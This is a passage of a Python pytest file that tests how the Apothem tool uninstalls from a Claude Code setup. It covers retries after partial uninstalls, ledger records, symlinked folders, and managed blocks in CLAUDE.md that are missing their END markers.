    Returns that file, and the uninstall's exit code and envelope.
    """
    _unrecorded_install(claude)
    stuck = claude / "agents" / "citation-auditor.md"
    real_unlink = Path.unlink

    def refuse(self: Path, missing_ok: bool = False) -> None:
        if self == stuck:
            raise PermissionError("in use")
        real_unlink(self, missing_ok=missing_ok)

    monkeypatch.setattr(Path, "unlink", refuse)
    code, envelope = _uninstall()
    monkeypatch.setattr(Path, "unlink", real_unlink)
    return stuck, code, envelope


def test_a_retry_after_a_finished_uninstall_removes_what_could_not_go(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    stuck, code, envelope = _stuck_after_a_finished_uninstall(claude, monkeypatch)
    kinds = _kinds(claude)
    # Only the unfinished record is left to show the install: the files the
    # first pass kept under .apothem are gone as well.
    shutil.rmtree(claude / ".apothem")
    installed = ClaudeCodeAdapter().is_installed()
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert kinds == ["uninstall", "uninstall-incomplete"]
    assert installed is True
    assert retry_code == 0, retry
    assert retry["status"] == "success"
    assert not stuck.exists()
    assert _kinds(claude) == ["uninstall"]
    assert ClaudeCodeAdapter().is_installed() is False


@pytest.mark.parametrize("gate_removed", [False, True])
def test_a_retry_after_a_prune_still_removes_what_could_not_go(
    claude: Path, monkeypatch: pytest.MonkeyPatch, gate_removed: bool
) -> None:
    """Retention keeps the finished uninstall that unfinished ones follow.

    Cut back to the unfinished record alone, the ledger shows no finished
    uninstall: the retry then stops at "not installed" once the conformity
    gate is removed by hand, and otherwise ends as if there were no record.
    """
    stuck, code, envelope = _stuck_after_a_finished_uninstall(claude, monkeypatch)
    install_driver.prune_history("claude_code")
    kinds = _kinds(claude)
    if gate_removed:
        (claude / ".apothem" / "support" / "conformity" / "gate.py").unlink()
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert kinds == ["uninstall", "uninstall-incomplete"]
    assert retry_code == 0, retry
    assert retry["status"] == "success"
    assert not stuck.exists()
    assert _kinds(claude) == ["uninstall"]


def test_apothems_files_behind_a_link_after_a_finished_uninstall_stop_it(
    claude: Path, tmp_path: Path
) -> None:
    _unrecorded_install(claude)
    rules = claude / "rules"
    dotfiles = tmp_path / "dotfiles" / "rules"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(rules), str(dotfiles))
    _link_folder(rules, dotfiles)
    before = sorted(path.name for path in dotfiles.iterdir())

    code, envelope = _uninstall()
    after = sorted(path.name for path in dotfiles.iterdir())
    kinds = _kinds(claude)
    _restore_link(rules, dotfiles)
    retry_code, retry = _uninstall()

    assert before
    assert code == cli._EXIT_PARTIAL, envelope
    assert "still loads them" in envelope["results"][0]["message"]
    assert after == before
    assert kinds == ["uninstall", "uninstall-incomplete"]
    assert retry_code == 0, retry
    assert not list(rules.glob("*.md"))


@pytest.mark.parametrize(
    ("raised", "seen"),
    [
        (OSError("listing failed"), install_driver.MaterializationError),
        (KeyboardInterrupt(), KeyboardInterrupt),
    ],
)
def test_a_pass_that_stops_after_a_finished_uninstall_records_itself_unfinished(
    claude: Path,
    monkeypatch: pytest.MonkeyPatch,
    raised: BaseException,
    seen: type[BaseException],
) -> None:
    _unrecorded_install(claude)

    def stop(*args: object, **kwargs: object) -> list[object]:
        raise raised

    monkeypatch.setattr(install_driver_lifecycle, "left_behind", stop)
    with pytest.raises(seen):
        ClaudeCodeAdapter().uninstall()

    assert _kinds(claude) == ["uninstall", "uninstall-incomplete"]


def _fail_an_install(monkeypatch: pytest.MonkeyPatch) -> None:
    """Run an install that fails at its first entry, so it undoes itself.

    It appends a rollback of an id no install record has.
    """

    def fail(*args: object, **kwargs: object) -> object:
        raise OSError(errno.EIO, "I/O error")

    with monkeypatch.context() as patch:
        patch.setattr(install_driver, "_dispatch_install_entry", fail)
        with pytest.raises(OSError, match="I/O error"):
            ClaudeCodeAdapter().install({})


def test_a_failed_installs_own_rollback_keeps_the_retry_after_a_stuck_pass(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    stuck, code, envelope = _stuck_after_a_finished_uninstall(claude, monkeypatch)
    _fail_an_install(monkeypatch)
    kinds = _kinds(claude)
    # Only the ledger is left to show the install, as in the retry above.
    shutil.rmtree(claude / ".apothem")
    installed = ClaudeCodeAdapter().is_installed()
    retry_code, retry = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert kinds == ["uninstall", "uninstall-incomplete", "rollback"]
    assert installed is True
    assert retry_code == 0, retry
    assert retry["status"] == "success"
    assert not stuck.exists()
    assert _kinds(claude) == ["uninstall"]


def test_a_failed_installs_own_rollback_after_a_finished_uninstall_changes_nothing(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _unrecorded_install(claude)
    _fail_an_install(monkeypatch)
    agent = claude / "agents" / "citation-auditor.md"
    present = agent.is_file()

    code, envelope = _uninstall()

    assert present
    assert code == 0, envelope
    assert envelope["status"] == "success"
    assert not agent.exists()
    assert _kinds(claude) == ["uninstall"]


@pytest.mark.parametrize("finished_before", [True, False])
def test_a_managed_block_no_install_record_lists_stays_and_is_named(
    claude: Path, finished_before: bool
) -> None:
    if finished_before:
        _unrecorded_install(claude)
    else:
        ClaudeCodeAdapter().install({})
        shutil.rmtree(install_ledger.ledger_path("claude_code").parent)
    anchor = claude / "CLAUDE.md"
    before = anchor.read_bytes()

    code, envelope = _uninstall()

    assert code == (0 if finished_before else cli._EXIT_PARTIAL), envelope
    assert anchor.read_bytes() == before
    (note,) = [w for w in envelope["warnings"] if w["path"] == str(anchor)]
    assert note["message"].startswith(f"{anchor} still holds Apothem's managed block")
    assert note["message"].endswith("by hand if you no longer want them")
    assert "detail" not in note


def test_each_bolt_on_anchor_with_a_block_is_named(tmp_path: Path) -> None:
    from apothem.harnesses._shared import install_driver_retention as retention
    from apothem.lib.harness_materializer import merge_managed_block

    block = merge_managed_block("", "rules")
    claude_md = tmp_path / "CLAUDE.md"
    claude_md.write_text(f"mine\n\n{block}", encoding="utf-8")
    profile = tmp_path / install_driver.PROFILE_DOCUMENT_RELATIVE
    profile.parent.mkdir(parents=True)
    profile.write_text(block, encoding="utf-8")

    named = [w.path for w in retention.unlisted_block_warnings(tmp_path)]
    skipped = retention.unlisted_block_warnings(tmp_path, skip={str(claude_md)})

    assert named == [str(claude_md), str(profile)]
    assert [w.path for w in skipped] == [str(profile)]


def test_a_path_kept_after_a_finished_uninstall_says_how_to_remove_it(
    claude: Path,
) -> None:
    _unrecorded_install(claude)
    gate = claude / ".apothem" / "support" / "conformity" / "gate.py"

    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert plain.exit_code == 0, plain.output
    assert "remove them by hand if you no longer want them" in plain.stdout
    assert f"\n    {gate}" in plain.stdout


def test_one_path_kept_after_a_finished_uninstall_says_how_to_remove_it() -> None:
    reason, message = written._why_kept(None, None, None, ended=True)

    assert reason == "no-active-install"
    assert message.endswith("remove it by hand if you no longer want it")


def _unreadable_claude_md(claude: Path) -> tuple[Path, str]:
    """Install, save CLAUDE.md in another encoding, uninstall (partial)."""
    ClaudeCodeAdapter().install({})
    anchor = claude / "CLAUDE.md"
    installed = anchor.read_text(encoding="utf-8")
    anchor.write_bytes(installed.encode("utf-8") + b"\nmy line \xff\n")
    code, _ = _uninstall()
    assert code == cli._EXIT_PARTIAL
    return anchor, installed


def test_a_claude_md_edited_beside_the_block_is_finished_by_the_retry(
    claude: Path,
) -> None:
    # The block, not the whole file, is what Apothem wrote: text of your own
    # beside it must not make the retry read as not installed.
    anchor, installed = _unreadable_claude_md(claude)
    anchor.write_text(installed + "\nmy own line\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    text = anchor.read_text(encoding="utf-8")
    assert "my own line" in text
    assert "BEGIN APOTHEM MANAGED BLOCK" not in text
    assert _unfinished(claude) is None


def test_a_retry_leaves_a_claude_md_whose_block_lost_its_end_marker(
    claude: Path,
) -> None:
    # Nothing shows where the block ends, so the text below it may be yours:
    # the file is not Apothem's any more, and the retry leaves it as it is.
    anchor, installed = _unreadable_claude_md(claude)
    broken = installed.replace(APOTHEM_BLOCK_END, "") + "my own line\n"
    anchor.write_text(broken, encoding="utf-8")
    before = anchor.read_bytes()

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert anchor.read_bytes() == before
    assert any(
        "CLAUDE.md" in str(w["message"]) and APOTHEM_BLOCK_END in str(w["message"])
        for w in envelope["warnings"]
    ), envelope
    assert _unfinished(claude) is None


def test_a_managed_block_counts_only_while_both_markers_are_there(
    tmp_path: Path,
) -> None:
    anchor = tmp_path / "CLAUDE.md"
    entry = LedgerTarget(
        path=str(anchor), mode="sentinel_merge", ownership_class="operator-owned"
    )
    block = wrap_managed_block("rules")
    anchor.write_text(f"mine\n\n{block}\nmore of mine\n", encoding="utf-8")
    edited = written.still_written(entry)
    cut = block.replace(APOTHEM_BLOCK_END, "")
    anchor.write_text(f"mine\n\n{cut}more of mine\n", encoding="utf-8")

    assert edited is True
    assert written.still_written(entry) is False


def test_an_uninstall_keeps_your_text_after_a_stray_begin_marker(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    anchor = claude / "CLAUDE.md"
    stray = f"{APOTHEM_BLOCK_BEGIN}\nmy notes\n\n"
    anchor.write_bytes((stray + anchor.read_text(encoding="utf-8")).encode())

    code, envelope = _uninstall()

    assert code == 0, envelope
    assert anchor.read_bytes() == f"{APOTHEM_BLOCK_BEGIN}\nmy notes\n".encode()
    named = [
        str(w["message"])
        for w in envelope["warnings"]
        if APOTHEM_BLOCK_END in str(w["message"])
    ]
    assert len(named) == 1, envelope["warnings"]
    assert "CLAUDE.md" in named[0]


def _endless(text: str = "rules") -> bytes:
    block = wrap_managed_block(text).replace(APOTHEM_BLOCK_END, "")
    return f"{block}my own line\n".encode()


def test_a_block_without_its_end_behind_a_link_is_left_with_a_warning(
    claude: Path, tmp_path: Path
) -> None:
    # Nothing is changed, so the link does not stop the uninstall.
    home = claude.parent
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    _link_folder(home / "linked", elsewhere)
    (elsewhere / "AGENTS.md").write_bytes(_endless())

    result = install_driver.strip_managed_anchor(
        home / "linked" / "AGENTS.md",
        install_root=home,
        harness_name="claude_code",
        allowed_root=home,
    )

    assert result is not None
    assert result.outcome == "warning"
    assert APOTHEM_BLOCK_END in result.message
    assert (elsewhere / "AGENTS.md").read_bytes() == _endless()


def test_a_block_without_its_end_in_a_non_utf8_file_is_left_with_a_warning(
    claude: Path,
) -> None:
    home = claude.parent
    target = home / "AGENTS.md"
    target.write_bytes(_endless() + b"mine \xff\n")

    result = install_driver.strip_managed_anchor(
        target, install_root=home, harness_name="claude_code", allowed_root=home
    )

    assert result is not None
    assert result.outcome == "warning"
    assert target.read_bytes() == _endless() + b"mine \xff\n"


def test_an_install_stays_possibly_open_until_an_uninstall_closes_it(
    claude: Path,
) -> None:
    # A root the ledger knows nothing about, or whose only record is an
    # unfinished uninstall, may still be installed; an uninstall closes it.
    def record(kind: str) -> None:
        install_ledger.append_record(
            LedgerRecord.create(harness="claude_code", root=_root(claude), kind=kind)
        )

    unknown = blocks.install_may_be_open("claude_code", claude)
    record("uninstall-incomplete")
    unfinished = blocks.install_may_be_open("claude_code", claude)
    record("uninstall")

    assert unknown is True
    assert unfinished is True
    assert blocks.install_may_be_open("claude_code", claude) is False


def test_an_uninstall_leaves_a_file_with_another_marked_block(claude: Path) -> None:
    # A marker pair the user quotes is not Apothem's block: the file stays as it
    # is, the warning names it, and the install stays open for a retry.
    ClaudeCodeAdapter().install({})
    anchor = claude / "CLAUDE.md"
    quoted = f"```\n{APOTHEM_BLOCK_BEGIN}\nmy example\n{APOTHEM_BLOCK_END}\n```\n"
    anchor.write_bytes(anchor.read_bytes() + b"\n" + quoted.encode())
    before = anchor.read_bytes()

    code, envelope = _uninstall()

    assert code != 0, envelope
    assert anchor.read_bytes() == before
    assert any("CLAUDE.md" in str(w["message"]) for w in envelope["warnings"]), envelope
    assert _unfinished(claude) is not None


def test_a_rollback_of_a_recorded_install_closes_it(claude: Path) -> None:
    def record(kind: str, install_id: str) -> None:
        install_ledger.append_record(
            LedgerRecord.create(
                harness="claude_code",
                root=_root(claude),
                kind=kind,
                install_id=install_id,
            )
        )

    record("install", "known")
    record("rollback", "known")
    closed = blocks.install_may_be_open("claude_code", claude)
    record("rollback", "never-installed")
    orphan = blocks.install_may_be_open("claude_code", claude)

    assert closed is False
    assert orphan is True


def _cut_the_end_marker(anchor: Path) -> None:
    """Drop the END marker of *anchor*'s block and add a line of your own below."""
    text = anchor.read_text(encoding="utf-8").replace(APOTHEM_BLOCK_END, "")
    anchor.write_text(text + "my own line\n", encoding="utf-8")


def _earlier_release_with_an_edited_agent(claude: Path) -> None:
    """Install as an earlier release recorded it, then edit one of its agents.

    The uninstall keeps that agent and says to run apothem update.
    """
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = sorted((claude / "agents").glob("*.md"))[0]
    agent.write_text("my own agent\n", encoding="utf-8")


def _failure_text(output: str) -> tuple[int, str]:
    """Run the uninstall; return its exit code and its failure text."""
    if output == "json":
        code, envelope = _uninstall()
        return code, str(envelope["results"][0]["message"])
    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )
    return plain.exit_code, plain.stderr


_FIX_FIRST = (
    "first copy any listed file you edited or added, and fix the 1 file(s) "
    "whose warnings name an Apothem marker: until a later release, an update "
    "rewrites a managed block from a BEGIN marker with no END marker to the end "
    "of the file, cutting your text after it; then run apothem update, then "
    "apothem uninstall again"
)


@pytest.mark.parametrize("output", ["plain", "json"])
def test_the_update_step_says_to_fix_a_file_with_a_lone_begin_marker_first(
    claude: Path, output: str
) -> None:
    _earlier_release_with_an_edited_agent(claude)
    _cut_the_end_marker(claude / "CLAUDE.md")

    code, failure = _failure_text(output)

    assert code == cli._EXIT_PARTIAL, failure
    assert _FIX_FIRST in failure


@pytest.mark.parametrize("output", ["plain", "json"])
def test_the_update_step_names_no_marker_when_no_warning_does(
    claude: Path, output: str
) -> None:
    _earlier_release_with_an_edited_agent(claude)

    code, failure = _failure_text(output)

    assert code == cli._EXIT_PARTIAL, failure
    assert "whose warnings name an Apothem marker" not in failure
    assert (
        "first copy any listed file you edited or added; then run apothem "
        "update, then apothem uninstall again"
    ) in failure


def test_a_claude_md_without_its_end_and_no_record_comes_before_the_update(
    claude: Path,
) -> None:
    # With no install record, the next step is apothem update, which would cut
    # the text below the BEGIN marker: the warning is the END-less one.
    ClaudeCodeAdapter().install({})
    anchor = claude / "CLAUDE.md"
    _cut_the_end_marker(anchor)
    shutil.rmtree(install_ledger.ledger_path("claude_code").parent)
    before = anchor.read_bytes()

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert anchor.read_bytes() == before
    (note,) = [w for w in envelope["warnings"] if w["path"] == str(anchor)]
    assert note["detail"] == {blocks.MARKER_LEFT: "1"}
    assert APOTHEM_BLOCK_END in note["message"]
    assert "whose warnings name an Apothem marker" in envelope["results"][0]["message"]


@pytest.mark.parametrize("marker", [True, False])
def test_a_stopped_uninstall_says_to_fix_a_file_with_a_lone_begin_marker_first(
    claude: Path, monkeypatch: pytest.MonkeyPatch, marker: bool
) -> None:
    _earlier_release_with_an_edited_agent(claude)
    if marker:
        _cut_the_end_marker(claude / "CLAUDE.md")

    def broken(*args: object, **kwargs: object) -> list[object]:
        raise OSError("listing failed")

    monkeypatch.setattr(install_driver_lifecycle, "left_behind", broken)
    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    message = str(envelope["results"][0]["message"])
    assert "listing failed" in message
    caveat = "Before you run apothem update, fix the 1 file(s) whose warnings"
    assert (caveat in message) is marker


def test_each_warning_for_a_marker_left_in_a_file_carries_marker_left(
    tmp_path: Path,
) -> None:
    endless = tmp_path / "endless.md"
    endless.write_bytes(_endless())
    stray = tmp_path / "stray.md"
    stray.write_text(f"{APOTHEM_BLOCK_BEGIN}\nmy notes\n", encoding="utf-8")
    whole = tmp_path / "whole.md"
    whole.write_text(f"mine\n\n{wrap_managed_block('rules')}", encoding="utf-8")
    rewritten = [
        install_driver.MaterializationResult(
            outcome="updated",
            operation="surgical_uninstall",
            path=str(path),
            message="removed the block",
        )
        for path in (stray, whole)
    ]

    warnings = [
        blocks.endless_block_warning(endless, "surgical_uninstall"),
        blocks.another_block_warning(whole),
        *blocks.stray_begin_warnings(rewritten),
    ]

    assert [w.path if w else None for w in warnings] == [
        str(endless),
        str(whole),
        str(stray),
    ]
    assert all(w is not None and w.detail[blocks.MARKER_LEFT] == "1" for w in warnings)
    assert blocks.endless_block_warning(whole, "surgical_uninstall") is None
